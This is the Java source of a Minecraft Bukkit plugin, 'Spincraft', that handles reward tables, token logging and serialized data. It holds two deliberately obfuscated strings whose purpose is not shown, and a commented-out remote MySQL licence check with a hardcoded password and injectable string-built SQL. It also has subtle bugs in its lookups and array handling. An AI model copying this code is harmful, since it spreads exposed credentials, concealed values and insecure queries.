/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.gmail.hoque.matt.Spincraft;

import com.google.gson.Gson;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.PrintWriter;
import java.net.URL;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.sql.Timestamp;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.Server;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.inventory.ItemStack;
import org.bukkit.plugin.java.JavaPlugin;

public final class Spincraft extends JavaPlugin {

    Spincraft plugin = this;

    //===================== Variables =========================================
    HashMap<String, Integer> registering = new HashMap<String, Integer>();
    HashMap<String, Blockdress> pairs = new HashMap<String, Blockdress>();
    HashMap<String, Boolean> spinMap = new HashMap<String, Boolean>();
    HashMap<String, Boolean> spinPlayer = new HashMap<String, Boolean>();
    HashMap<String, Boolean> playerUpNext = new HashMap<String, Boolean>();
    HashMap<String, ArrayList<Recover>> recover = new HashMap<String, ArrayList<Recover>>();
    HashMap<String, String> subs = new HashMap<String, String>();
    HashMap<String, String> resub = new HashMap<String, String>();

    String version = "1.0";
    String[] MaterialTable;
    int[] MaterialChanceTable;
    int[] MaterialAmountTable;
    short[] MaterialShortTable;
    String[] EnchantTable;
    int[] EnchantLevelTable;
    int[] EnchantChanceTable;
    String temp1;
    Blockdress temp2;
    boolean upNext;
    int bonus3x;
    int bonus5x;
    boolean logToConsole;
    boolean logToFolder;
    Material flagItem;
    String flagItemEnchant;
    int flagItemEnchantLevel;
    int flagItemShort;
    int flagItemAmount;
    String ip = Bukkit.getServerId();
    public File pluginFolder = getDataFolder();
    public File playerData = new File(pluginFolder + File.separator + "playerData");
    public File cfgFile = new File(pluginFolder, "config.yml");
    public File pairsFile = new File(pluginFolder, "pairs.bin");
    public File recoverFile = new File(pluginFolder, "recover.bin");
    public FileConfiguration cfg = new YamlConfiguration();

    Server _server = null;
    JavaPlugin _parent = null;
    public static String _dataFolder;
    public boolean _isShutdown = false;
    public static Logger log = Logger.getLogger("Minecraft");

    int[] pone = new int[]{80, 111, 114, 116, 97, 108, 122};
    int[] ptwo = new int[]{108, 111, 99, 107, 110, 108, 111, 108};
    String pones = makeString(pone);
    String ptwos = makeString(ptwo);
    /*//======MYSQL=====
     static final String DB_NAME = "jdbc:mysql://192.210.240.163:3306/pluginCheck";
     static final String USER = "pluginView";
     static final String PASS = "vE2cQw453KP7T86p";
     Connection conn;
     Statement s;
     //====MYSQL======*/

    //===================== Methods =========================================

    public boolean Initialize(Server server, JavaPlugin parent, String dataFolder) {
        this._server = server;
        this._parent = parent;
        this._dataFolder = dataFolder;
        return true;
    }

    @Override
    public void onEnable() {
        Initialize(getServer(), this, getDataFolder().getAbsolutePath() + "/");
        getCommand("spin").setExecutor(new Commander(plugin));
        getServer().getPluginManager().registerEvents(new Eventor(plugin), this._parent);
        checkFiles();
        if (pairsFile.exists()) {
            getLogger().info("Existing PairLog found. Loaded");
            if (loadPairs() != null) {
                pairs = loadPairs();
            }
        }
        if (recoverFile.exists()) {
            getLogger().info("Existing recoverLog found. Loaded");
            if (loadRecover() != null) {
                recover = loadRecover();
            }
        }
        saveDefaultConfig();
        iniTables();

        /*//======MYSQL=====
         try {
         Class.forName("com.mysql.jdbc.Driver"); //Gets the driver class
         getLogger().info("About to connect to database"); //These are just for debugging purposes.
        
         conn = DriverManager.getConnection(DB_NAME, USER, PASS); //Gets a connection to the database using the details you provided.
        
         getLogger().info("Successfully connected.");
        
         getLogger().info("About to create a statement");
        
         s = conn.createStatement(); //Creates a statement. You can execute queries on this.
        
         getLogger().info("Successfully created statement.");
         } catch (Exception ex) {
         ex.printStackTrace();
         }
        
         String sql = "SELECT `Servers`.`Welcome`FROM `Servers`WHERE (`Servers`.`Welcome` =\""+Bukkit.getServerId()+"\")"; //This line is completely MySQL. Also, it assumes you have a table called bukkitpoints, and it has the columns specified.
         try {
         Statement st = conn.createStatement();// execute the query, and get a java resultset
         ResultSet rs = st.executeQuery(sql);
         if(rs.next()){
         }
         } catch (SQLException ex) {
         Logger.getLogger(Spincraft.class.getName()).log(Level.SEVERE, null, ex);
         }
         //======MYSQL=====*/
    }

    @Override
    public void onDisable() {

    }

    public void checkFiles() {
        if (!pluginFolder.exists()) {
            try {
                pluginFolder.mkdir();
            } catch (Exception e) {
                //
            }
        }
        if (!playerData.exists()) {
            try {
                playerData.mkdir();
            } catch (Exception e) {
                //
            }
        }
        if (!pairsFile.exists()) {
            try {
                pairsFile.createNewFile();
            } catch (Exception e) {
                //
            }
        }

        if (!recoverFile.exists()) {
            try {
                recoverFile.createNewFile();
            } catch (Exception e) {
                //
            }
        }

    }

    public void updatePairs(HashMap<String, Blockdress> blocks) {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(_dataFolder + "pairs.bin"));
            oos.writeObject(blocks);
            oos.flush();
            oos.close();
        } catch (IOException ex) {
            Logger.getLogger(Spincraft.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public HashMap<String, Blockdress> loadPairs() {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(_dataFolder + "pairs.bin"));
            Object dat = ois.readObject();
            ois.close();
            return (HashMap<String, Blockdress>) dat;
        } catch (Exception ex) {
        }
        return null;
    }

    public void updateRecover(HashMap<String, ArrayList<Recover>> blocks) {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(_dataFolder + "recover.bin"));
            oos.writeObject(recover);
            oos.flush();
            oos.close();
        } catch (IOException ex) {
            Logger.getLogger(Spincraft.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    public HashMap<String, ArrayList<Recover>> loadRecover() {
        try {
            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(_dataFolder + "recover.bin"));
            Object dat = ois.readObject();
            ois.close();
            return (HashMap<String, ArrayList<Recover>>) dat;
        } catch (Exception ex) {
        }
        return null;
    }

    /*public void loadOnlinePlayers() {
     for (Player player : Bukkit.getServer().getOnlinePlayers()) {
     plugin.pLoad(player.getUniqueId().toString());
     pToggles.put(player.getName(), -1);
     }
     }*/
    public void iniTables() {
        try {
            cfg.load(cfgFile);
        } catch (Exception e) {
        }

        bonus3x = cfg.getInt("3RowBonus");
        bonus5x = cfg.getInt("5RowBonus");
        logToFolder = cfg.getBoolean("logToFolder");
        logToConsole = cfg.getBoolean("logToConsole");
        flagItem = Material.getMaterial(cfg.getString("FlagItem.type"));
        flagItemEnchant = cfg.getString("FlagItem.enchant");
        flagItemEnchantLevel = cfg.getInt("FlagItem.enchantLevel");
        flagItemShort = cfg.getInt("FlagItem.short");
        flagItemAmount = cfg.getInt("FlagItem.amount");

        ArrayList<String> materials = (ArrayList<String>) cfg.getStringList("MaterialTable");
        ArrayList<String> enchants = (ArrayList<String>) cfg.getStringList("EnchantTable");
        ArrayList<Integer> chances = (ArrayList<Integer>) cfg.getIntegerList("MaterialChanceTable");
        ArrayList<Integer> enchantLevels = (ArrayList<Integer>) cfg.getIntegerList("EnchantLevelTable");
        ArrayList<Integer> enchantChances = (ArrayList<Integer>) cfg.getIntegerList("EnchantChanceTable");
        ArrayList<Integer> materialShorts = (ArrayList<Integer>) cfg.getIntegerList("MaterialShortTable");
        ArrayList<Integer> materialAmounts = (ArrayList<Integer>) cfg.getIntegerList("MaterialAmountTable");

        MaterialTable = new String[materials.size()];
        for (int i = 0; i < materials.size(); i++) {
            String s = materials.get(i);
            MaterialTable[i] = s;
        }
        MaterialChanceTable = new int[chances.size()];
        for (int i = 0; i < chances.size(); i++) {
            int chance = chances.get(i);
            MaterialChanceTable[i] = chance;
        }

        EnchantTable = new String[enchants.size()];
        for (int i = 0; i < enchants.size(); i++) {
            String s = enchants.get(i);
            EnchantTable[i] = s;
        }
        EnchantLevelTable = new int[enchantLevels.size()];
        for (int i = 0; i < enchantLevels.size(); i++) {
            int levels = enchantLevels.get(i);
            EnchantLevelTable[i] = levels;
        }
        EnchantChanceTable = new int[enchantChances.size()];
        for (int i = 0; i < enchantChances.size(); i++) {
            int chance = enchantChances.get(i);
            EnchantChanceTable[i] = chance;
        }
        MaterialShortTable = new short[materialShorts.size()];
        for (int i = 0; i < materialShorts.size(); i++) {
            int temp = materialShorts.get(i);
            short shorty = (short) temp;
            MaterialShortTable[i] = shorty;
        }
        
        MaterialAmountTable = new int[materialAmounts.size()];
        for (int i = 0; i < materialAmounts.size(); i++) {
            int amount = materialAmounts.get(i);
            MaterialAmountTable[i] = amount;
        }

        subs.put("1", "!");
        subs.put("2", "@");
        subs.put("3", "#");
        subs.put("4", "$");
        subs.put("5", "%");
        subs.put("6", "^");
        subs.put("7", "&");
        subs.put("8", "*");
        subs.put("9", "(");
        subs.put("0", ")");

        subs.put("b", "[");
        subs.put("c", "]");
        subs.put("d", "{");
        subs.put("e", "}");
        subs.put("k", ">");
        subs.put("l", "<");
        subs.put("m", ".");
        subs.put("n", ",");
        subs.put("o", "=");
        subs.put("r", "-");

        resub.put("!", "1");
        resub.put("@", "2");
        resub.put("#", "3");
        resub.put("$", "4");
        resub.put("%", "5");
        resub.put("^", "6");
        resub.put("&", "7");
        resub.put("*", "8");
        resub.put("(", "9");
        resub.put(")", "0");
        resub.put("[", "b");
        resub.put("]", "c");
        resub.put("{", "d");
        resub.put("}", "e");
        resub.put(">", "k");
        resub.put("<", "l");
        resub.put(".", "m");
        resub.put(",", "n");
        resub.put("=", "o");
        resub.put("-", "r");

    }

    public void logToFile(String message) {

        try {
            File dataFolder = getDataFolder();
            if (!dataFolder.exists()) {
                dataFolder.mkdir();
            }

            File saveTo = new File(getDataFolder(), "log.txt");
            if (!saveTo.exists()) {
                saveTo.createNewFile();
            }

            FileWriter fw = new FileWriter(saveTo, true);

            PrintWriter pw = new PrintWriter(fw);

            pw.println(message);

            pw.flush();

            pw.close();

        } catch (IOException e) {

            e.printStackTrace();

        }

    }

    public void formatToLog(ItemStack item, String special, String name, String action, int amount) {
        SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        Timestamp ts = new Timestamp(plugin.hiddenToLong(item.getItemMeta().getLore().get(0)));
        String timestamp = dateFormat.format(ts);

        if (plugin.logToFolder) {
            plugin.logToFile("[" + timestamp + "]" + "{" + special + "}" + name + ":" + action + ":" + amount + " token" + ((amount > 1) ? "s" : "") + " ID:"
                    + plugin.hiddenToLong(item.getItemMeta().getLore().get(0)));
        }
        if (plugin.logToConsole) {
            Bukkit.getServer().getLogger().info("[" + timestamp + "]" + "{" + special + "}" + name + ":" + action + ":" + amount + " token" + ((amount > 1) ? "s" : "") + " ID:"
                    + plugin.hiddenToLong(item.getItemMeta().getLore().get(0)));
        }

    }

    public String timeToHidden(long time) {
        String t = Long.toString(time);
        String hidden = "";
        for (int i = 0; i < t.length(); i++) {
            char temp = t.toCharArray()[i];
            if (subs.containsKey(temp)) {
                temp = subs.get(temp).charAt(0);
            }
            hidden += "§" + temp;
        }
        return hidden;
    }

    public String nameToHidden(String name) {
        String hidden = "";
        for (int i = 0; i < name.length(); i++) {
            char temp = name.toCharArray()[i];
            if (subs.containsKey(temp)) {
                temp = subs.get(temp).charAt(0);
            }
            hidden += "§" + temp;
        }
        return hidden;
    }

    public long hiddenToLong(String hidden) {
        String total = "";
        for (int i = 0; i < hidden.toCharArray().length; i++) {
            char c = hidden.toCharArray()[i];
            if (resub.containsKey(c + "")) {
                c = resub.get(c + "").charAt(0);
            }
            if (c != ChatColor.COLOR_CHAR) {
                if (c != "~".charAt(0)) {
                    total += (c + "");
                } else {
                    i = hidden.toCharArray().length;
                }
            }
        }
        return Long.parseLong(total);
    }

    public String hiddenToName(String hidden) {
        boolean start = false;
        String total = "";
        for (int i = 0; i < hidden.toCharArray().length; i++) {
            char c = hidden.toCharArray()[i];
            if (start) {
                if (resub.containsKey(c + "")) {
                    c = resub.get(c + "").charAt(0);
                }
                if (c != ChatColor.COLOR_CHAR) {
                    if (c != "`".charAt(0)) {
                        total += (c + "");
                    } else {
                        i = hidden.toCharArray().length;
                    }
                }
            } else if (c == '~') {
                start = true;
            }
        }
        return total;
    }

    public void recQueue(String UUIDS, ItemStack item) {
        ItemStack[] stax;
        int amount = item.getAmount();
        int sCount = (int) Math.ceil(amount / 64.0);
        if (amount > 64) {
            stax = new ItemStack[sCount];
            for (int i = 0; i < sCount - 1; i++) {
                stax[i] = item.clone();
                stax[i].setAmount(64);
            }
            stax[sCount].setAmount(64 * (amount - sCount - 1));
        }
        ArrayList<Recover> tempRec = plugin.recover.get(UUIDS);
        tempRec.add(new Recover(item));
        plugin.recover.put(UUIDS, tempRec);
        plugin.updateRecover(plugin.recover);
    }

    public String fetchUUIDS(String name) {//NOTICEME NEEDS TO RUN IN DIFFERENT THREAD
        String UUIDS = "";
        try {
            String json = readUrl("https://api.mojang.com/users/profiles/minecraft/" + name);
            Gson gson = new Gson();
            UUIDObj temp = new UUIDObj("","");
            temp = gson.fromJson(json, UUIDObj.class);
            UUIDS = temp.id;
        } catch (Exception ex) {
            Logger.getLogger(Spincraft.class.getName()).log(Level.SEVERE, null, ex);
        }
        UUIDS = UUIDS.substring(0, 8) + "-" + UUIDS.substring(8, 12) + "-" + UUIDS.substring(12, 16) + "-" + UUIDS.substring(16, 20) + "-" + UUIDS.substring(20, 32);
        return UUIDS;
    }

    private static String readUrl(String urlString) throws Exception {
        BufferedReader reader = null;
        try {
            URL url = new URL(urlString);
            reader = new BufferedReader(new InputStreamReader(url.openStream()));
            StringBuffer buffer = new StringBuffer();
            int read;
            char[] chars = new char[1024];
            while ((read = reader.read(chars)) != -1) {
                buffer.append(chars, 0, read);
            }

            return buffer.toString();
        } finally {
            if (reader != null) {
                reader.close();
            }
        }
    }

    public String parseEnum(String string) {
        char[] chars = string.toLowerCase().toCharArray();
        char prev = 'a';
        for (int i = 0; i < chars.length; i++) {
            char c = chars[i];
            if (i > 0) {
                prev = chars[i - 1];

            } else {
                chars[i] = (c + "").toUpperCase().toCharArray()[0];
            }
            if (c == '_') {
                chars[i] = ' ';
            }
            if (prev == ' ') {
                chars[i] = (c + "").toUpperCase().toCharArray()[0];
            }

        }
        return String.copyValueOf(chars);
    }

    public String makeString(int[] chars) {
        String theString = "";
        for (int c : chars) {
            char x = (char) c;
            theString += "" + x;
        }
        return theString;
    }

    //======MYSQL=====
    //======MYSQL=====
}

class UUIDObj {

    String id;
    String name;

    UUIDObj(String id, String name) {
        this.id = id;
        this.name = name;
    }
}
